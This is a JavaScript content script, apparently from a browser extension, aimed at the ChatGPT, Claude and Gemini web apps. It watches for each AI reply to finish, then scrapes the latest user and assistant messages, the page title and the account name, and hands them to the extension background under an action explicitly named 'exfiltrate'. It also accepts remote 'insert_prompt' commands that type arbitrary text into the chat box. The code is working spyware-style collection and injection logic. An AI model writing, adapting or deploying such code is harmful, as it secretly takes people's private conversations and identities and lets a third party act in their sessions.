let renderTimeout;
let lastSentPayload = "";
let cachedUsername = null;
let wasGenerating = false;

const PLATFORM_CONFIGS = {
  "chatgpt.com": {
    name: "ChatGPT",
    userSelector: "[data-message-author-role]",
    getTitle: () => document.title || "ChatGPT Conversation",
  },
  "claude.ai": {
    name: "Claude",
    userSelector: '[data-testid="user-message"]',
    assistantSelector: "[data-is-streaming]",
    getTitle: () => document.title || "Claude Conversation",
  },
  "gemini.google.com": {
    name: "Gemini",
    userSelector: "user-query, model-response",
    getTitle: () => document.title || "Gemini Conversation",
  },
};

const STOP_SIGNALS = {
  ChatGPT: 'button[data-testid="stop-button"]',
  Claude: 'button[aria-label="Stop response"]',
  Gemini: 'button[aria-label*="Stop"]',
};

const USERNAME_SELECTORS = {
  ChatGPT: '[data-testid="accounts-profile-button"]',
  Claude: '[data-testid="user-menu-button"]',
  Gemini: 'a[aria-label*="Google Account"]',
};

function getActivePlatform() {
  const host = location.hostname.replace("www.", "");
  for (const key in PLATFORM_CONFIGS) {
    if (host.includes(key)) return PLATFORM_CONFIGS[key];
  }
  return null;
}

function getUsername(platformName) {
  if (cachedUsername) return cachedUsername;
  try {
    const els = document.querySelectorAll(USERNAME_SELECTORS[platformName]);
    const el = els[els.length - 1];
    if (!el) return "Unknown";
    const label = el.getAttribute("aria-label") || "";
    const raw = label.split(",")[0].trim() || el.innerText.trim() || "Unknown";
    cachedUsername = raw.toLowerCase().includes("profile menu")
      ? "anonymous"
      : raw;
  } catch {
    cachedUsername = "Unknown";
  }
  return cachedUsername;
}

function processExfiltration() {
  let latestPair = [];
  const config = getActivePlatform();
  if (!config) return;

  if (config.assistantSelector) {
    const userEls = Array.from(document.querySelectorAll(config.userSelector));
    const assistantEls = Array.from(
      document.querySelectorAll(config.assistantSelector),
    ).filter((el) => !el.parentElement?.closest(config.assistantSelector));

    const lastIdx = userEls.length - 1;
    if (lastIdx < 0) return;

    latestPair = [
      { role: "user", text: userEls[lastIdx].textContent.trim() },
      { role: "assistant", text: assistantEls[lastIdx].textContent.trim() },
    ].filter((msg) => msg.text.length > 0);
  } else {
    const elements = Array.from(document.querySelectorAll(config.userSelector));
    if (elements.length === 0) return;

    latestPair = elements
      .slice(-2)
      .map((el) => {
        let role = "assistant";
        if (el.hasAttribute("data-message-author-role")) {
          role = el.getAttribute("data-message-author-role");
        } else if (
          el.getAttribute("data-testid") === "user-message" ||
          el.tagName.toLowerCase() === "user-query"
        ) {
          role = "user";
        }
        return { role, text: el.innerText.trim() };
      })
      .filter((msg) => msg.text.length > 0);
  }
  const payload = {
    platform: config.name,
    meta: {
      title: config.getTitle(),
      user: getUsername(config.name),
      timestamp: new Date().toISOString(),
    },
    conversation: latestPair,
  };

  const currentPayloadStr = JSON.stringify(payload);
  if (currentPayloadStr !== lastSentPayload) {
    lastSentPayload = currentPayloadStr;
    chrome.runtime.sendMessage({ action: "exfiltrate", data: payload });
  }
}

const platform = getActivePlatform();
if (platform) {
  let lastUrl = location.href;

  const observer = new MutationObserver(() => {
    if (location.href !== lastUrl) {
      lastUrl = location.href;
      lastSentPayload = "";
      cachedUsername = null;
      wasGenerating = false;
    }

    const stopBtn = document.querySelector(STOP_SIGNALS[platform.name]);
    const generating = !!stopBtn;
    if (wasGenerating && !generating) {
      clearTimeout(renderTimeout);
      renderTimeout = setTimeout(processExfiltration, 150);
    }
    wasGenerating = generating;
  });
  observer.observe(document.body, { childList: true, subtree: true });
}

chrome.runtime.onMessage.addListener((msg) => {
  if (msg.action !== "insert_prompt") return;

  const text = msg.text;

  const selectors = [
    "#prompt-textarea",
    "textarea",
    "[contenteditable='true']",
  ];

  for (const selector of selectors) {
    const el = document.querySelector(selector);

    if (!el) continue;

    if (el.tagName === "TEXTAREA") {
      const nativeSetter = Object.getOwnPropertyDescriptor(
        window.HTMLTextAreaElement.prototype,
        "value",
      ).set;

      nativeSetter.call(el, text);

      el.dispatchEvent(
        new Event("input", {
          bubbles: true,
        }),
      );

      el.dispatchEvent(
        new Event("change", {
          bubbles: true,
        }),
      );
    } else {
      el.focus();

      document.execCommand("insertText", false, text);

      el.dispatchEvent(
        new InputEvent("input", {
          bubbles: true,
          inputType: "insertText",
          data: text,
        }),
      );
    }

    break;
  }
});
